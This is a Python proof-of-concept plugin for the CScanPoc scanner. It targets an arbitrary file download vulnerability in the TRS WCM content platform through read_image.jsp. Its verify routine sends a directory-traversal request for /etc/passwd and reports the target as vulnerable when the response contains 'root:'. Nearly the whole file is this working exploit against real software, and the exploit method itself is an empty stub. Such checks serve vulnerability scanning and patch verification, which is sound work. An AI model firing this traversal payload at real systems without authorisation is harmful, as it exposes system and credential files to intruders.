# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    poc_id = 'f80f7cf9-946e-4cc1-aa77-0675f7729f30'
    name = '拓尔思内容协作平台 /wcm/app/system/read_image.jsp 任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-08-16'  # 漏洞公布时间
    desc = '''
        拓尔思内容协作平台 /wcm/app/system/read_image.jsp 任意文件下载漏洞。
    ''' # 漏洞描述
    ref = 'http://reboot.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'TRS WCM(拓尔思内容协作平台)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1427ad91-18a7-4772-bd45-5e8a6e30cbab'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/wcm/app/system/read_image.jsp?filename=../../../../../../../../../../../../../../../../../etc/passwd'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if "root:" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()